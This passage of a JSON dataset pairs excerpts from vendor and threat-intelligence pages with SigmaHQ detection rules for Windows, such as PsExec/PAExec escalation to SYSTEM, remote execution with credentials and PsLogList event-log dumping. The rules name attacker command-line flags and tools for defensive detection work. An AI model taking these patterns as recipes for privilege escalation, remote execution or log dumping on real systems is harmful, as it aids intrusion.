      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-11-23",
      "modified": "2024-03-05",
      "tags": [
        "attack.resource-development",
        "attack.t1587.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_sys": {
          "CommandLine|contains|windash": [
            " -s cmd",
            " -s -i cmd",
            " -i -s cmd",
            " -s pwsh",
            " -s -i pwsh",
            " -i -s pwsh",
            " -s powershell",
            " -s -i powershell",
            " -i -s powershell"
          ]
        },
        "selection_other": {
          "CommandLine|contains": [
            "psexec",
            "paexec",
            "accepteula"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Admins that use PsExec or PAExec to escalate to the SYSTEM account for maintenance purposes (rare)",
        "Users that debug Microsoft Intune issues using the commands mentioned in the official documentation; see https://learn.microsoft.com/en-us/mem/intune/apps/intune-management-extension"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sysinternals_psexec_paexec_escalate_system.yml"
  },
  "584": {
    "url": "https://www.poweradmin.com/paexec/",
    "markdown": "## Launch Remote Windows Apps PAExec lets you launch Windows programs on remote Windows computers without needing to install software on the remote computer first. For example, you could launch CMD.EXE remotely and have the equivalent of a terminal session to the remote server. PAExec is useful for doing remote installs, checking remote configuration, etc. ### PAExec - The Redistributable PsExec Microsoft's PsExec tool (originally by SysInternal's Mark Russinovich) is a favorite of system administrators everywhere. It just has one tiny flaw: Microsoft will **not** allow PsExec to be redistributed. We needed something that we could ship, and not finding",
    "sigma_rule": {
      "title": "PsExec/PAExec Escalation to LOCAL SYSTEM",
      "id": "8834e2f7-6b4b-4f09-8906-d2276470ee23",
      "related": [
        {
          "id": "207b0396-3689-42d9-8399-4222658efc99",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects suspicious commandline flags used by PsExec and PAExec to escalate a command line to LOCAL_SYSTEM rights",
      "references": [
        "https://learn.microsoft.com/en-us/sysinternals/downloads/psexec",
        "https://www.poweradmin.com/paexec/",
        "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-11-23",
      "modified": "2024-03-05",
      "tags": [
        "attack.resource-development",
        "attack.t1587.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_sys": {
          "CommandLine|contains|windash": [
            " -s cmd",
            " -s -i cmd",
            " -i -s cmd",
            " -s pwsh",
            " -s -i pwsh",
            " -i -s pwsh",
            " -s powershell",
            " -s -i powershell",
            " -i -s powershell"
          ]
        },
        "selection_other": {
          "CommandLine|contains": [
            "psexec",
            "paexec",
            "accepteula"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Admins that use PsExec or PAExec to escalate to the SYSTEM account for maintenance purposes (rare)",
        "Users that debug Microsoft Intune issues using the commands mentioned in the official documentation; see https://learn.microsoft.com/en-us/mem/intune/apps/intune-management-extension"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sysinternals_psexec_paexec_escalate_system.yml"
  },
  "585": {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/",
    "markdown": "# Unhappy Hour Special: KEGTAP and SINGLEMALT With a Ransomware Chaser **October 28, 2020** --- Throughout 2020, ransomware activity has become increasingly prolific, relying on an ecosystem of distinct but co-enabling operations to gain access to targets of interest before conducting extortion. Mandiant Threat Intelligence has tracked several loader and backdoor campaigns that lead to the post-compromise deployment of ransomware, sometimes within 24 hours of initial compromise. Effective and fast detection of these campaigns is key to mitigating this threat. The malware families enabling these attacks previously reported by Mandiant to intelligence subscribers include KEGTAP/BEERBOT, SINGLEMALT/STILLBOT, and WINEKEY/CORKBOT. While these",
    "sigma_rule": {
      "title": "PsExec/PAExec Escalation to LOCAL SYSTEM",
      "id": "8834e2f7-6b4b-4f09-8906-d2276470ee23",
      "related": [
        {
          "id": "207b0396-3689-42d9-8399-4222658efc99",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects suspicious commandline flags used by PsExec and PAExec to escalate a command line to LOCAL_SYSTEM rights",
      "references": [
        "https://learn.microsoft.com/en-us/sysinternals/downloads/psexec",
        "https://www.poweradmin.com/paexec/",
        "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-11-23",
      "modified": "2024-03-05",
      "tags": [
        "attack.resource-development",
        "attack.t1587.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_sys": {
          "CommandLine|contains|windash": [
            " -s cmd",
            " -s -i cmd",
            " -i -s cmd",
            " -s pwsh",
            " -s -i pwsh",
            " -i -s pwsh",
            " -s powershell",
            " -s -i powershell",
            " -i -s powershell"
          ]
        },
        "selection_other": {
          "CommandLine|contains": [
            "psexec",
            "paexec",
            "accepteula"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Admins that use PsExec or PAExec to escalate to the SYSTEM account for maintenance purposes (rare)",
        "Users that debug Microsoft Intune issues using the commands mentioned in the official documentation; see https://learn.microsoft.com/en-us/mem/intune/apps/intune-management-extension"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sysinternals_psexec_paexec_escalate_system.yml"
  },
  "586": {
    "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/psexec",
    "markdown": "# PsExec v2.43 Published: April 11, 2023 **Download PsTools** (5 MB) ## Introduction Utilities like Telnet and remote control programs like Symantec's PC Anywhere let you execute programs on remote systems, but they can be a pain to set up and require that you install client software on the remote systems that you wish to access. PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software. PsExec's most powerful uses include launching interactive command-prompts on remote systems and remote-enabling tools like IpConfig that",
    "sigma_rule": {
      "title": "Potential PsExec Remote Execution",
      "id": "ea011323-7045-460b-b2d7-0f7442ea6b38",
      "status": "test",
      "description": "Detects potential psexec command that initiate execution on a remote systems via common commandline flags used by the utility",
      "references": [
        "https://learn.microsoft.com/en-us/sysinternals/downloads/psexec",
        "https://www.poweradmin.com/paexec/",
        "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-02-28",
      "tags": [
        "attack.resource-development",
        "attack.t1587.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "accepteula",
            " -u ",
            " -p ",
            " \\\\\\\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sysinternals_psexec_remote_execution.yml"
  },
  "587": {
    "url": "https://www.poweradmin.com/paexec/",
    "markdown": "## Launch Remote Windows Apps PAExec lets you launch Windows programs on remote Windows computers without needing to install software on the remote computer first. For example, you could launch CMD.EXE remotely and have the equivalent of a terminal session to the remote server. PAExec is useful for doing remote installs, checking remote configuration, etc. ### PAExec - The Redistributable PsExec Microsoft's PsExec tool (originally by SysInternal's Mark Russinovich) is a favorite of system administrators everywhere. It just has one tiny flaw: Microsoft will **not** allow PsExec to be redistributed. We needed something that we could ship, and not finding",
    "sigma_rule": {
      "title": "Potential PsExec Remote Execution",
      "id": "ea011323-7045-460b-b2d7-0f7442ea6b38",
      "status": "test",
      "description": "Detects potential psexec command that initiate execution on a remote systems via common commandline flags used by the utility",
      "references": [
        "https://learn.microsoft.com/en-us/sysinternals/downloads/psexec",
        "https://www.poweradmin.com/paexec/",
        "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-02-28",
      "tags": [
        "attack.resource-development",
        "attack.t1587.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "accepteula",
            " -u ",
            " -p ",
            " \\\\\\\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sysinternals_psexec_remote_execution.yml"
  },
  "588": {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/",
    "markdown": "# Unhappy Hour Special: KEGTAP and SINGLEMALT With a Ransomware Chaser **October 28, 2020** --- Throughout 2020, ransomware activity has become increasingly prolific, relying on an ecosystem of distinct but co-enabling operations to gain access to targets of interest before conducting extortion. Mandiant Threat Intelligence has tracked several loader and backdoor campaigns that lead to the post-compromise deployment of ransomware, sometimes within 24 hours of initial compromise. Effective and fast detection of these campaigns is key to mitigating this threat. The malware families enabling these attacks previously reported by Mandiant to intelligence subscribers include KEGTAP/BEERBOT, SINGLEMALT/STILLBOT, and WINEKEY/CORKBOT. While these",
    "sigma_rule": {
      "title": "Potential PsExec Remote Execution",
      "id": "ea011323-7045-460b-b2d7-0f7442ea6b38",
      "status": "test",
      "description": "Detects potential psexec command that initiate execution on a remote systems via common commandline flags used by the utility",
      "references": [
        "https://learn.microsoft.com/en-us/sysinternals/downloads/psexec",
        "https://www.poweradmin.com/paexec/",
        "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-02-28",
      "tags": [
        "attack.resource-development",
        "attack.t1587.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "accepteula",
            " -u ",
            " -p ",
            " \\\\\\\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sysinternals_psexec_remote_execution.yml"
  },
  "589": {
    "url": "https://web.archive.org/web/20231124132223/https://research.nccgroup.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/",
    "markdown": "# Abusing cloud services to fly under the radar **Categories**: Fox-IT, Managed Detection & Response, Threat Intelligence **Date**: January 12, 2021 ## tl;dr NCC Group and Fox-IT have been tracking a threat group with a wide set of interests, from intellectual property (IP) from victims in the semiconductors industry through to data from the airline industry. In their intrusions, they regularly abuse cloud services from Google and Microsoft to achieve their goals. NCC Group and Fox-IT observed this threat actor during various incident response engagements performed between October 2019 until April 2020. Our threat intelligence analysts noticed clear overlap between",
    "sigma_rule": {
      "title": "Suspicious Use of PsLogList",
      "id": "aae1243f-d8af-40d8-ab20-33fc6d0c55bc",
      "status": "test",
      "description": "Detects usage of the PsLogList utility to dump event log in order to extract admin accounts and perform account discovery or delete events logs",
      "references": [
        "https://web.archive.org/web/20231124132223/https://research.nccgroup.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/",
        "https://www.cybereason.com/blog/deadringer-exposing-chinese-threat-actors-targeting-major-telcos",
        "https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Sysinternals/PsLogList",
        "https://twitter.com/EricaZelic/status/1614075109827874817"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-12-18",
      "modified": "2024-03-05",
      "tags": [
        "attack.discovery",
        "attack.t1087",
        "attack.t1087.001",
        "attack.t1087.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": "psloglist.exe"
          },
          {
            "Image|endswith": [
              "\\psloglist.exe",
              "\\psloglist64.exe"
            ]
          }
        ],
        "selection_cli_eventlog": {
          "CommandLine|contains": [
            " security",
            " application",
            " system"
          ]
        },
        "selection_cli_flags": {
          "CommandLine|contains|windash": [
            " -d",
            " -x",
            " -s",
            " -c",
            " -g"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Another tool that uses the command line switches of PsLogList",
        "Legitimate use of PsLogList by an administrator"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sysinternals_psloglist.yml"
  },
  "590": {
    "url": "https://www.cybereason.com/blog/deadringer-exposing-chinese-threat-actors-targeting-major-telcos",
    "markdown": "# DeadRinger: Exposing Chinese Threat Actors Targeting Major Telcos --- ### Executive Summary Following the discovery of Hafnium attacks targeting Microsoft Exchange vulnerabilities, the Cybereason Nocturnus and Incident Response teams proactively hunted for various threat actors trying to leverage similar techniques in-the-wild. In early 2021, the Cybereason Nocturnus Team investigated clusters of intrusions detected targeting the telecommunications industry across Southeast Asia. During the investigation, three clusters of activity were identified and showed significant connections to known threat actors, all suspected to be operating on behalf of Chinese state interests. The report comes on the heels of the Biden administration’s public",
    "sigma_rule": {
      "title": "Suspicious Use of PsLogList",
      "id": "aae1243f-d8af-40d8-ab20-33fc6d0c55bc",
      "status": "test",
      "description": "Detects usage of the PsLogList utility to dump event log in order to extract admin accounts and perform account discovery or delete events logs",
      "references": [
        "https://web.archive.org/web/20231124132223/https://research.nccgroup.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/",
        "https://www.cybereason.com/blog/deadringer-exposing-chinese-threat-actors-targeting-major-telcos",
        "https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Sysinternals/PsLogList",
        "https://twitter.com/EricaZelic/status/1614075109827874817"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-12-18",
      "modified": "2024-03-05",
      "tags": [
        "attack.discovery",
        "attack.t1087",
        "attack.t1087.001",
        "attack.t1087.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": "psloglist.exe"
          },
          {
            "Image|endswith": [
              "\\psloglist.exe",
              "\\psloglist64.exe"
            ]
          }
        ],
        "selection_cli_eventlog": {
          "CommandLine|contains": [
            " security",
            " application",
            " system"
          ]
        },
        "selection_cli_flags": {
          "CommandLine|contains|windash": [
            " -d",
            " -x",
            " -s",
            " -c",
            " -g"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Another tool that uses the command line switches of PsLogList",
        "Legitimate use of PsLogList by an administrator"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sysinternals_psloglist.yml"
  },
  "591": {
    "url": "https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Sysinternals/PsLogList",
    "markdown": "# PsLogList ## Table of Contents - PsLogList - Table of Contents - Acknowledgement(s) - Description - Versions History - File Metadata - Common CommandLine - Threat Actor Ops (TAOps) - Common Process Trees - Default Install Location - DFIR Artifacts - Examples In The Wild - Documentation - Blogs / Reports References - ATT&CK Techniques - Telemetry - Detection Validation - Detection Rules - LOLBAS / GTFOBins References ## Acknowledgement(s) - 3CORESec - @3CORESec - Nasreddine Bencherchali - @nas_bench ## Description > **PsLogList lets you dump the contents of an Event Log on the local or a remote computer**",
    "sigma_rule": {
      "title": "Suspicious Use of PsLogList",
      "id": "aae1243f-d8af-40d8-ab20-33fc6d0c55bc",
      "status": "test",
      "description": "Detects usage of the PsLogList utility to dump event log in order to extract admin accounts and perform account discovery or delete events logs",
      "references": [
        "https://web.archive.org/web/20231124132223/https://research.nccgroup.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/",
        "https://www.cybereason.com/blog/deadringer-exposing-chinese-threat-actors-targeting-major-telcos",
        "https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Sysinternals/PsLogList",
        "https://twitter.com/EricaZelic/status/1614075109827874817"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-12-18",
      "modified": "2024-03-05",
      "tags": [
        "attack.discovery",
        "attack.t1087",
        "attack.t1087.001",
        "attack.t1087.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": "psloglist.exe"
          },
          {
            "Image|endswith": [
              "\\psloglist.exe",
              "\\psloglist64.exe"
            ]
          }
        ],
        "selection_cli_eventlog": {
          "CommandLine|contains": [
            " security",
            " application",
            " system"
          ]
        },
        "selection_cli_flags": {
          "CommandLine|contains|windash": [
            " -d",
            " -x",
            " -s",
            " -c",
            " -g"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Another tool that uses the command line switches of PsLogList",
        "Legitimate use of PsLogList by an administrator"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sysinternals_psloglist.yml"
  },
  "592": {
    "url": "https://twitter.com/EricaZelic/status/1614075109827874817",
    "markdown": "# Post Jan 14, 2023 My nightly Windows reading is never boring: ```image Description: The image is a webpage screenshot about \"PsLogList v2.81,\" a utility from a Resource Kit that enables the dumping of Event Log contents from both local and remote computers. It highlights that PsLogList is similar to elogdump but additionally allows access to remote systems beyond current security credentials. The page includes options for downloading PsTools and displays the publication details. Transcription: | **PsLogList v2.81** Article · 03/23/2021 · 2 minutes to read · 4 contributors By Mark Russinovich Published: March 05, 2019 Download PsTools (2.7 MB)",
    "sigma_rule": {
      "title": "Suspicious Use of PsLogList",
      "id": "aae1243f-d8af-40d8-ab20-33fc6d0c55bc",
      "status": "test",
      "description": "Detects usage of the PsLogList utility to dump event log in order to extract admin accounts and perform account discovery or delete events logs",
      "references": [
        "https://web.archive.org/web/20231124132223/https://research.nccgroup.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/",
        "https://www.cybereason.com/blog/deadringer-exposing-chinese-threat-actors-targeting-major-telcos",
        "https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Sysinternals/PsLogList",
        "https://twitter.com/EricaZelic/status/1614075109827874817"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-12-18",
      "modified": "2024-03-05",
      "tags": [
        "attack.discovery",
        "attack.t1087",
        "attack.t1087.001",
        "attack.t1087.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": "psloglist.exe"
          },
          {
            "Image|endswith": [
              "\\psloglist.exe",
              "\\psloglist64.exe"
            ]
          }
        ],
        "selection_cli_eventlog": {
          "CommandLine|contains": [
            " security",
            " application",
            " system"
          ]
        },
        "selection_cli_flags": {
          "CommandLine|contains|windash": [
            " -d",
            " -x",
            " -s",
            " -c",
            " -g"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Another tool that uses the command line switches of PsLogList",
        "Legitimate use of PsLogList by an administrator"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sysinternals_psloglist.yml"
  },
  "593": {
    "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/psexec",
    "markdown": "# PsExec v2.43 Published: April 11, 2023 **Download PsTools** (5 MB) ## Introduction Utilities like Telnet and remote control programs like Symantec's PC Anywhere let you execute programs on remote systems, but they can be a pain to set up and require that you install client software on the remote systems that you wish to access. PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software. PsExec's most powerful uses include launching interactive command-prompts on remote systems and remote-enabling tools like IpConfig that",
    "sigma_rule": {
      "title": "Potential Privilege Escalation To LOCAL SYSTEM",
      "id": "207b0396-3689-42d9-8399-4222658efc99",
      "related": [
        {
          "id": "8834e2f7-6b4b-4f09-8906-d2276470ee23",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects unknown program using commandline flags usually used by tools such as PsExec and PAExec to start programs with SYSTEM Privileges",
      "references": [
        "https://learn.microsoft.com/en-us/sysinternals/downloads/psexec",
        "https://www.poweradmin.com/paexec/",
        "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-05-22",
      "modified": "2024-03-05",
      "tags": [
        "attack.resource-development",
        "attack.t1587.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|windash": [
            " -s cmd",
            " -s -i cmd",
            " -i -s cmd",
            " -s pwsh",
            " -s -i pwsh",
            " -i -s pwsh",
            " -s powershell",
            " -s -i powershell",
            " -i -s powershell"
          ]
        },
        "filter_main_exclude_coverage": {
          "CommandLine|contains": [
            "paexec",
            "PsExec",
            "accepteula"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Weird admins that rename their tools",
        "Software companies that bundle PsExec/PAExec with their software and rename it, so that it is less embarrassing"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sysinternals_susp_psexec_paexec_flags.yml"
  },
  "594": {
    "url": "https://www.poweradmin.com/paexec/",
    "markdown": "## Launch Remote Windows Apps PAExec lets you launch Windows programs on remote Windows computers without needing to install software on the remote computer first. For example, you could launch CMD.EXE remotely and have the equivalent of a terminal session to the remote server. PAExec is useful for doing remote installs, checking remote configuration, etc. ### PAExec - The Redistributable PsExec Microsoft's PsExec tool (originally by SysInternal's Mark Russinovich) is a favorite of system administrators everywhere. It just has one tiny flaw: Microsoft will **not** allow PsExec to be redistributed. We needed something that we could ship, and not finding",
    "sigma_rule": {
      "title": "Potential Privilege Escalation To LOCAL SYSTEM",
      "id": "207b0396-3689-42d9-8399-4222658efc99",
      "related": [
        {
          "id": "8834e2f7-6b4b-4f09-8906-d2276470ee23",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects unknown program using commandline flags usually used by tools such as PsExec and PAExec to start programs with SYSTEM Privileges",
      "references": [
        "https://learn.microsoft.com/en-us/sysinternals/downloads/psexec",
        "https://www.poweradmin.com/paexec/",
        "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-05-22",
      "modified": "2024-03-05",
      "tags": [
        "attack.resource-development",
        "attack.t1587.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|windash": [
            " -s cmd",
            " -s -i cmd",
            " -i -s cmd",
            " -s pwsh",
            " -s -i pwsh",
            " -i -s pwsh",
            " -s powershell",
            " -s -i powershell",
            " -i -s powershell"
          ]
        },
        "filter_main_exclude_coverage": {
          "CommandLine|contains": [
            "paexec",
            "PsExec",
            "accepteula"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Weird admins that rename their tools",
        "Software companies that bundle PsExec/PAExec with their software and rename it, so that it is less embarrassing"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sysinternals_susp_psexec_paexec_flags.yml"
  },
  "595": {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/",
    "markdown": "# Unhappy Hour Special: KEGTAP and SINGLEMALT With a Ransomware Chaser **October 28, 2020** --- Throughout 2020, ransomware activity has become increasingly prolific, relying on an ecosystem of distinct but co-enabling operations to gain access to targets of interest before conducting extortion. Mandiant Threat Intelligence has tracked several loader and backdoor campaigns that lead to the post-compromise deployment of ransomware, sometimes within 24 hours of initial compromise. Effective and fast detection of these campaigns is key to mitigating this threat. The malware families enabling these attacks previously reported by Mandiant to intelligence subscribers include KEGTAP/BEERBOT, SINGLEMALT/STILLBOT, and WINEKEY/CORKBOT. While these",
    "sigma_rule": {
      "title": "Potential Privilege Escalation To LOCAL SYSTEM",
      "id": "207b0396-3689-42d9-8399-4222658efc99",
      "related": [
        {
          "id": "8834e2f7-6b4b-4f09-8906-d2276470ee23",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects unknown program using commandline flags usually used by tools such as PsExec and PAExec to start programs with SYSTEM Privileges",
      "references": [
        "https://learn.microsoft.com/en-us/sysinternals/downloads/psexec",
        "https://www.poweradmin.com/paexec/",
        "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-05-22",
      "modified": "2024-03-05",
      "tags": [
        "attack.resource-development",
        "attack.t1587.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|windash": [
            " -s cmd",
            " -s -i cmd",
            " -i -s cmd",
            " -s pwsh",
            " -s -i pwsh",
            " -i -s pwsh",
            " -s powershell",
            " -s -i powershell",
            " -i -s powershell"
          ]
        },
        "filter_main_exclude_coverage": {
          "CommandLine|contains": [
            "paexec",
            "PsExec",
            "accepteula"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Weird admins that rename their tools",
        "Software companies that bundle PsExec/PAExec with their software and rename it, so that it is less embarrassing"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sysinternals_susp_psexec_paexec_flags.yml"
  },
  "596": {
    "url": "Internal Research",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential Signing Bypass Via Windows Developer Features",
      "id": "a383dec4-deec-4e6e-913b-ed9249670848",
      "related": [
        {
          "id": "b110ebaf-697f-4da1-afd5-b536fa27a2c1",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects when a user enable developer features such as \"Developer Mode\" or \"Application Sideloading\". Which allows the user to install untrusted packages.",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\SystemSettingsAdminFlows.exe"
          },
          {
            "OriginalFileName": "SystemSettingsAdminFlows.EXE"
          }
        ],
        "selection_flag": {
          "CommandLine|contains": "TurnOnDeveloperFeatures"
        },
        "selection_options": {
          "CommandLine|contains": [
            "DeveloperUnlock",
            "EnableSideloading"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_systemsettingsadminflows_turn_on_dev_features.yml"
  },
  "597": {
    "url": "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
    "markdown": "# Inside Malicious Windows Apps for Malware Deployment **Date:** July 14, 2022 This article discusses Windows Apps – Windows applications packaged into *APPX* or *MSIX* packages – as a medium to deploy malware. Though not as widely abused as other infection vectors, there have been a number of recent high profile attacks that use Windows Apps. - **November, 2021:** BazarBackdoor was distributed in the form of an *APPX* package. - **December, 2021:** Emotet malware was distributed by abusing a spoofing vulnerability in the Windows App Installer, software that installs Windows Apps. - **January, 2022:** Malicious Windows Apps in *APPX* format",
    "sigma_rule": {
      "title": "Potential Signing Bypass Via Windows Developer Features",
      "id": "a383dec4-deec-4e6e-913b-ed9249670848",
      "related": [
        {
          "id": "b110ebaf-697f-4da1-afd5-b536fa27a2c1",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects when a user enable developer features such as \"Developer Mode\" or \"Application Sideloading\". Which allows the user to install untrusted packages.",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\SystemSettingsAdminFlows.exe"
          },
          {
            "OriginalFileName": "SystemSettingsAdminFlows.EXE"
          }
        ],
        "selection_flag": {
          "CommandLine|contains": "TurnOnDeveloperFeatures"
        },
        "selection_options": {
          "CommandLine|contains": [
            "DeveloperUnlock",
            "EnableSideloading"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_systemsettingsadminflows_turn_on_dev_features.yml"
  },
  "598": {
    "url": "https://unit42.paloaltonetworks.com/chromeloader-malware/",
